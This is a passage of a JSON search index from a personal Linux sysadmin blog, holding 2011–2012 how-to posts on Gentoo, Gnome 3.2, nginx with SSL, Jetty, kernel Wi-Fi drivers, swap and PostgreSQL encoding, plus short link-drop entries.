yet. https://extensions.gnome.org/extension/130/advanced-settings-in-usermenu/https://extensions.gnome.org/extension/38/windows-alt-tab/https://extensions.gnome.org/extension/6/applications-menu/ My feeling about Gnome 3.2: I'm very impress, even my Suspend to Ram work almost Perfect. It's quite workable, there some problem out like some long time for single application to start, links to file browser a broken or sometime you just have to relog. But i like it, it's smooth working and lots of fun! \u0026nbsp; \u0026nbsp; ","permalink":"https://blog.akendo.eu/post/2012-02-03-gentoo-migration-to-3-2/","tags":["emerge","Gentoo","Gernal","Gnome","Linux","Software","Xorg"],"title":"Gentoo migration to Gnome 3.2"},{"categories":null,"contents":"\rFor fetching some date, my Application need a xserver. The Problem is that it's running on VM. So i install a basic xdm. I'll accessing this via VNC.\rapt-get install tightvncserver\rapt-get install xdm\rNow starting the xdm and tightvncserver\r/etc/init.d/xdm start\rtightvncserver :1\rtightvncserver will ask for vnc password. This will be ask during a VNC client is connecting.\rNow connect to the server $IP:5901. There is a lonley bash wating ;-)\r","permalink":"https://blog.akendo.eu/post/2012-01-26-basic-xserver-on-a-vserver/","tags":["apt-get","Debian","Gernal","Linux","vnc","Xorg","Xserver"],"title":"Basic xserver on a vServer"},{"categories":null,"contents":"\rFor a demo Application that has to be show in the Internet, we need a Scala Lift online. This contains sensitive data, so i need SSL. But the Jetty Server were all the Scala Lift Application is no able to handle Name or SSL so easliy (Or it can, but i have no idea how to do it). So i want that my Website allowing access via http, but then redicting to the HTTPS Page. Just made sure, i add a password so no one unknown can see it.\rFirst create a new SSL Certificate :\rcd /usr/nginx/\rmkdir SSL\rcd SSL\ropenssl genrsa -des3 -out server.key 1024\ropenssl req -new -key server.key -out server.csr\rcp server.key server.key.org\ropenssl rsa -in server.key.org -out server.key\ropenssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt\radd in your configuration /etc/nginx/site-avaiable/YOUR_DOMAINNAME_HERE\rserver {\rlisten 0.0.0.0:80;\rserver_name YOUR_DOMAINNAME_HERE,;\rlog_format main '$remote_addr - $remote_user [$time_local] $status '\r'\"$request\" $body_bytes_sent \"$http_referer\" '\r'\"$http_user_agent\" \"$http_x_forwarded_for\"';\raccess_log /var/log/nginx/YOUR_DOMAINNAME_HERE.log;\rrewrite ^(.*) https://YOUR_DOMAINNAME_HERE permanent;\r}\rserver {\rlisten 0.0.0.0:443;\rssl on;\rssl_certificate /etc/nginx/SSL/server.crt;\rssl_certificate_key /etc/nginx/SSL/server.key;\rserver_name YOUR_DOMAINNAME_HERE,;\raccess_log /var/log/nginx/ssl-YOUR_DOMAINNAME_HERE.log;\rlocation / {\rauth_basic \"Restricted\";\rauth_basic_user_file /etc/nginx/auth/dev-htpasswd;\rproxy_set_header X-Real-IP $remote_addr;\rproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\rproxy_set_header X-NginX-Proxy fale;\rproxy_set_header Host $host;\rproxy_pass http://localhost:8080;\r}\r}\rNow enable the configuration and restart the nginx.\r\u0026nbsp;\rSource:Nginx Wiki josephscott.org ","permalink":"https://blog.akendo.eu/post/2012-01-26-debiannginx-with-ssl/","tags":["apt-get","Debian","Gernal","Howto","Linux","Nginx","Webserver"],"title":"Nginx with SSL"},{"categories":null,"contents":"Jetty with a .WAR file\rIn my company i currenly have a lot to do with Scala Lift. We're developing some stuff with it, but because it takes a lots of time to setup a Scala environment and we need quick show solution, we'll go with a .war file.\rThe problem on my gentoo is, there is no jetty packages, so i searched for some overlays. I still got the java-overlay. With eix jetty, i'm searching for jetty:\r* www-servers/jetty [1]\rAvailable versions: (5) ~5.1.3-r1\r{doc source test}\rHomepage: http://www.mortbay.org/\rDescription: A Lightweight Servlet Engine\rThe jetty version is outdate, so i'm downloading the jetty from the offical webpage:\rwget -c http://dist.codehaus.org/jetty/jetty-6.1.26/jetty-6.1.26.zip\r#Now unzip it\rmkdir jetty \u0026amp;\u0026amp; unzip jetty-6.1.26.zip -d jetty/\rduring the download i found a useful blog entry about jetty for debian. How to deploy a .WAR file there. It's little bit like tomcat but just easier.\rMove you .WAR File to the $JETTY_HOME/webapps/ folder and start the Jetty Server.\rjava -jar start.jar\rI found also on the overlays.gentoo an updated version of jetty, this can be found on the dustin overlay\rlayman -a dustin\reix-sync \u0026amp;\u0026amp; eix jetty\r* www-servers/jetty [1]\rAvailable versions: (6) ~6.1.24\r{elibc_FreeBSD}\rHomepage: http://jetty.codehaus.org/\rDescription: Jetty Web Server; Java Servlet container\r[1] \"dustin\" /var/lib/layman/dustin\rI add the =www-servers/jetty-6.1.24 ~amd64 to /etc/portage/package.keywords, now install the jetty:\remerge -avq jetty\rso far\rAkendo\rWeb Sources:\rhttp://lifeofaprogrammergeek.blogspot.com/2010/06/deploying-war-in-jetty.htmlhttp://overlays.gentoo.org/proj/javahttp://gpo.zugaina.org/www-servers/jettyhttp://www.gentoo.org/proj/en/java/\u0026nbsp; ","permalink":"https://blog.akendo.eu/post/2012-01-19-gentoojetty-with-a-war-file/","tags":[".war","64-bit","Gentoo","Howto","Java","java","Jetty","Linux","Overlay","Software","System","Webserver"],"title":"[Gentoo]Jetty with a .WAR file"},{"categories":null,"contents":"I installed today the new Kernel 3.2 and didn't have any Wifi, that is related to some changes in the iwlagn divers. It have being rename to iwlwifi.\rI keep using a static Kernel for my Laptop and so i didn't enable the new driver automatically. My first idea was that the sys-kernel/linux-firmware has to be updated. But after short check on the Wifi devices everything was clear. No Devices was found with wlan0, so i check the driver and a try of loading the related module iwlagn.\rAfter wounder some minutes i check on the old and the new kernel. The dirver seems to be the same, just the name has change. i reanabled the new driver, re-compile the new kernel! Everything works normaly.\r\u0026nbsp;\rI check on the h-online and found this git diffs of the kernel.\rRename the iwlagn module as iwlwifi in preparation for future\rchanges. Add an alias to iwlagn for backward compatibility.\rNormaly there have to a an alias, but for static kernel the driver has to renable.\r\u0026nbsp;\rso far\rAkendo.\r\u0026nbsp;\rSources:Ubuntu Forum:\"Confused between iwlwifi vs iwlagn\"\rH-online:\"Kernel Log Part 1 Network\"\rH-online:\"Kernel Log Minor gems\"\r\u0026nbsp;\r\u0026nbsp; ","permalink":"https://blog.akendo.eu/post/2012-01-18-no-iwlagn-in-linux-3-2/","tags":["Gentoo","Gernal","iwlagn","iwlwifi","Kernel","Linux","Network","Wifi"],"title":"No iwlagn in Linux 3.2+"},{"categories":null,"contents":"I just updated my Blog. It's now move to my a host of my own. My old blog on blogger is still online, you can reach it with original URL 4k3nd0.blogger.com or b2.blog.akendo.eu\r\n\r\n\u0026nbsp;\r\n\r\nHave fun!\n","permalink":"https://blog.akendo.eu/post/2012-01-15-update-my-blog/","tags":["Blog","Gernal","Wordpress"],"title":"Update my Blog"},{"categories":null,"contents":"Bad applications does Bad stuff with you Memor. Today my Skype decide to flood my Memory. Lucky i notified this on the right time and was able to run killall -9 skype . But what left is a overfileld Memory and swap. For the Memory itself no problem, the kernel will empty it by demand. But for my older hard drive takes ages to get it back. So the best is it to empty it. The best way to do it: swapoff/swapon.\rswapoff /dev/sdb5\rThis take now a while but it will do the job.\rWhen it's done re-enable it with swapon /dev/sdb5 ","permalink":"https://blog.akendo.eu/post/2012-01-11-how-to-empty-swap/","tags":["Console","Debian","Gentoo","Gernal","Kernel 64-Bit","Linux","Swap","System"],"title":"How to empty swap"},{"categories":null,"contents":"The Problem\rI encounter a problem with fresh Debian VM. I create this VM for our developer, during the installation script following problem appears and stop the script:\rnew encoding (UTF8) is incompatible with the encoding of the template database (SQL_ASCII)\rHINT: Use the same encoding as in the template database, or use template0 as template.\rpsql:./__cre_database.sql:76: \\connect: FATAL: database \"db\" does not exist\rpsql: FATAL: database \"db\" does not exist\rAll database in postgres was created with SQL_ASCII\rThe Solution\rYou have to take care that you have a right UTF-8 setting in your bash environment. When you no LC option set, the default POSFIX will be used. postgres=# \\l\rList of databases\rName | Owner | Encoding | Collation | Ctype | Access privileges -----------+----------+-----------+-----------+-------+-----------------------\rpostgres | postgres | SQL_ASCII | C | C | : postgres=CTc/postgres\rtemplate0 | postgres | SQL_ASCII | C | C | =c/postgres template1 | postgres | SQL_ASCII | C | C | =c/postgres\r: postgres=CTc/postgres(3 rows)\rA check on the locale show's me that there is no UTF-8 support. The Solution is very easy. Enable UTF-8 on the Bash:\rexport LANG=\"en_US.UTF-8\"\rNote: You should add this to your /etc/profile! After this, re-install postgres via apt-get: apt-get remove --purge postgresql-8.4 \u0026\u0026 apt-get install apt-get install postgresql-8.4\rNow your Postgres Databases are in UTF-8.\r","permalink":"https://blog.akendo.eu/post/2012-01-03-debian-postgresql-8-4-cant-create-database-with-utf-8-encoding/","tags":["apt-get","bash","Debian","Linux","PostgreSQL","Postgresql","UTF-8"],"title":"Debian PostgreSQL 8.4 can't create Database with UTF-8 Encoding"},{"categories":null,"contents":"Happy new year to everyone! ","permalink":"https://blog.akendo.eu/post/2012-01-02-9/","tags":["Gernal","Nothing"],"title":"Happy new year!"},{"categories":null,"contents":" A lots of people dislike the Skype Software but have to use it. Many of my coworkers and friends using Skype. However, the Skype GUI is quite free \"feature\" and does provide it difficulties to deal with it. Thanks to skypetab-ng it get at least some \"usability\".\nI tried to run this by Hand, but for some reason the Compile wasn't able to create a 32-bit library.I just found a nice Overlay for Skypetab-ng, thanks to the Gentoo Forum! To work with the Overlay, just add the rion overlay to your system: layman -a rion All what's left to do is a eix-sync and just install with emerge skypetab-ng Sources: Gentoo Forums Post about SkypetabsOverlay Webpage for Skypetabs-ngskypetabs-ng ","permalink":"https://blog.akendo.eu/post/2011-12-27-skypetab-ng-on-gentoo/","tags":["Gentoo","Kernel 64-Bit","Linux","Overlay","Skype","Skypetab"],"title":"Skypetab-ng on Gentoo"},{"categories":null,"contents":"Welcome to my blog! I was planning to create a blog for a long time now. Here are some thoughts about this blog: The main purpose is to document.\nI will try to post as much as possible. The goal for this blog: It\u0026rsquo;s main purpose is documentation. Documentation about my work and problem of the everyday struggle.\nAbout me: My Name is Akendo and I’m the system-administrator of a small company that\u0026rsquo;s located in Berlin. Since August I’m working there full time. The work is not limited to administration only, but also implies work as a Python developer.\nI take care about the Mail and Web Servers. All of this systems are running in a virtual environments based on Xen. But also lots of small gems of the IT world like Git, Jabber, Asterisk, Django and Postgresql. Also some bad one, like Orace 10g or Windows Server 2003. But overall it’s a dream job.\n€dit:2017 - The grammar of the original post were bad. I re-wrote this post with prober language.\n€dit:2018 - Revise for better understandability\n","permalink":"https://blog.akendo.eu/post/2011-12-26-my-blog/","tags":null,"title":"My Blog"},{"categories":[],"contents":" Eat your own dog food, or you’ll end up eating… ","permalink":"https://blog.akendo.eu/flash/02.02.2020-linkdrop/","tags":[],"title":"02.02.2020 - link drop"},{"categories":["News"],"contents":" Charles Darwin’s hunch about early life was probably right - BBC Future Decrypting OpenSSH sessions for fun and profit – Fox-IT International blog ","permalink":"https://blog.akendo.eu/flash/12.11.2020-linkdrop/","tags":["Darwin","Secuirty","ssh"],"title":"12.11.2020 - link drop"},{"categories":["News"],"contents":" Emergency reboot/shutdown using SysRq · matoski.com The sea otter rescue plan that worked too well - BBC Future David Epstein on kind and wicked learning environments - Driverless Crocodile The intelligent monster that you should let eat you - BBC Future The psychology behind \u0026lsquo;revenge bedtime procrastination\u0026rsquo; - BBC Worklife Cognitive Load Theory: Explaining our fight for focus - BBC Worklife How to hack your concentration when you’re working from home | WIRED UK ","permalink":"https://blog.akendo.eu/flash/20.01.2021-linkdrop/","tags":["Linux"],"title":"20.01.2021 - link drop"},{"categories":["Rust","Java"],"contents":" What is Rust and why is it so popular? - Stack Overflow Blog GitHub - quay/clair: Vulnerability Static Analysis for Containers Reflection in Java - GeeksforGeeks ","permalink":"https://blog.akendo.eu/flash/22.02.2020-linkdrop/","tags":["Reflection"],"title":"22.02.2020 - link drop"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","permalink":"https://blog.akendo.eu/search/","tags":null,"title":"Search Results"}]